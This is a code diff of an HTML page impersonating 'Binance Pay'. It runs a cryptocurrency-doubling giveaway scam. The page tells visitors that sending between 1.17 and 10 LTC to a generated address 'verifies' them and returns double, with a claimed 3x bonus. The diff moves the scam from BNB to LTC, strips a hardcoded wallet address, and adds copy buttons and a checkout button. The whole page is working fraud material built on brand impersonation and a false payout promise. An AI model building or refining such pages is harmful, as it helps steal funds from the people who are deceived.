@@ -6,19 +6,20 @@
   <meta http-equiv="X-UA-Compatible" content="IE=edge" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>Binance Pay LTC</title>
+  <link rel="shortcut icon" href="public/images/Binance.png" type="image/x-icon">
   <link rel="stylesheet" href="public/css/index.css" />
   <link rel="stylesheet"
     href="https://fonts.googleapis.com/css2?family=Material+Symbols+Sharp:opsz,wght,FILL,GRAD@48,400,0,0" />
 </head>
 
 <body>
-  <div class="container" id="container">
+  <div class="container">
     <img id="img" src="/public/images/Binance-Logo.png" alt="binance" />
     <div class="container-box" id="container-box">
       <p>
         To verify your LTC address, just send from <span id="minAmount">1.17</span> to <span id="maxAmount"></span> LTC to the
         generated address below and get from <span id="min2"></span> to <span id="max2"></span> LTC (you will earn 3x
-        bonus if you send 10 LTC and above) sent back to the address you sent
+        bonus if you send 8 LTC and above) sent back to the address you sent
         LTC from or the one you specified below, you will get double of what
         you send to the giveaway address.
       </p>
@@ -67,7 +68,7 @@
               <img src="/public/images/Binance.png" alt="Binance" />
               <input type="number" onkeyup="bonusCalculation()" name="amount" class="amount" />
             </div>
-            <span class="warning">qwekjfsb vgkjf jekgnj jnektn sdnbgkrty<span id="_lessThan"></span></span>
+            <span class="warning"><span id="_lessThan"></span></span>
           </div>
           <span>=</span>
           <div class="input">
@@ -125,33 +126,43 @@
       </div>
     </div>
   </div>
-  <div class="paybox">
+  <div class="paybox" id="paybox">
     <div class="box">
       <div class="pay-box">
-        <img class="addressImage" alt="bnb-address" />
-        <p>Transfer 5 bnb to binance checkout</p>
+        <img class="addressImage" alt="ltc-address" />
+        <p>Transfer <span id="payment-amount">******</span> <span class="coin">****</span> to binance checkout for your giveaway top-up.</p>
         <p>0 confirmation</p>
         <p>spinning loading</p>
         <span>address: </span>
-        <p class="payment-address">bnb1xk05h8xzy4f4t2scg232gkj99m3u24q70cudkv <span class="material-symbols-sharp">
-          content_copy
-          </span></p>
-        <span>amount: </span>
-        <p class="payment-amount">5 <span class="material-symbols-sharp">
-          content_copy
-          </span></p>
+        <div class="copy-box">
+          <p class="payment-address"></p>
+          <button class="copy-btn material-symbols-sharp"> content_copy</button>
+        </div>
         <br />
-        <button>confirm payment</button>
+        <span>amount: </span>
+        <div class="copy-box">
+          <p class="payment-amount">*****</p>
+          <button class="copy-btn material-symbols-sharp"> content_copy</button>
+        </div>
       </div>
+      <button class="btn-checkout">confirm checkout</button>
     </div>
   </div>
-  <script src="public/jscript/main.js"></script>
+  <!-- <div class="payment-page">
+    <div class="lds-spinner"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div>    <p>checking transaction status</p>
+  </div> -->
+  <script src="/public/jscript/main.js"></script>
   <script>
-     let address = document.querySelector(".copy-link-input");
-        address.value = trxAddress;
-        const _lessThan = 3.52;
-    const _greaterThan = 10;
-    
+    const img = document.querySelector(".addressImage");
+    img.src = "/public/images/address/btc-address.PNG";
+    img.style.display = "none";
+    const address = document.querySelector(".payment-address");
+    address.innerText = ltcAddress;
+    coin.innerText = "ltc";
+
+    let _lessThan = 3.52;
+    let _greaterThan = 10;
+
     maxAmount.innerText = _greaterThan;
     minAmount.innerText = _lessThan;
     
